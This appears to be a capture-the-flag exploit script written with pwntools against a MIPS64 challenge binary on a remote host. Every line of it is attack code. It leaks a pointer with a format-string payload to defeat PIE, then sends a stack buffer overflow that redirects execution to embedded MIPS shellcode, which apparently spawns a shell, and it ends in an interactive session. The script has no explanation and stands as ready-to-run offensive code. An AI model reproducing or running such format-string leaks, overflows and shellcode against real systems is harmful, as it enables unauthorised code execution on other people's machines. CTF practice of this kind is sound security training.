#!/usr/bin/env python3

from time import sleep
from pwn import *

exe = context.binary = ELF('./chall')
context.arch = 'mips'
context.bits = 64
context.endian = 'little'
r=remote("gc1.eng.run", "30085")
r.recvuntil(b"+---------------------------------------+\n")
r.recvuntil(b"+---------------------------------------+\n")
r.sendline(b"A")
sleep(5)
r.recvuntil(b"Enter the price you are willing to offer !!\n")
r.sendline(b"%1$p")
sleep(5)
r.recvuntil(b"The Price has been set to \n\n")
main=int(r.recvline().strip(),16)-0x18240b4
exe.address = main-exe.sym.main
shellcode_addr=exe.address+0x1827d80+0x30
log.info(f"Pie base : {hex(exe.address)}")
log.info(f"Shellcode: {hex(shellcode_addr)}")
r.sendline(b"1")
r.recv()
r.sendline(b"C")
sleep(5)
r.recv()
shellcode =  b"\x62\x69\x0c\x3c\x2f\x2f\x8c\x35\xf4\xff\xac\xaf\x73\x68\x0d\x3c\x6e\x2f\xad\x35\xf8\xff\xad\xaf\xfc\xff\xa0\xaf\xf4\xff\xa4\x67\xff\xff\x05\x28\xff\xff\x06\x28\xc1\x13\x02\x24\x0c\x01\x01\x01"
exploit = b"A" * 40 + p64(shellcode_addr) + b"\x00\x00\x00\x00" * 32 + shellcode
r.sendline(exploit) 
sleep(5)
r.recvuntil(b"+---------------------------------------+\n")
r.interactive()
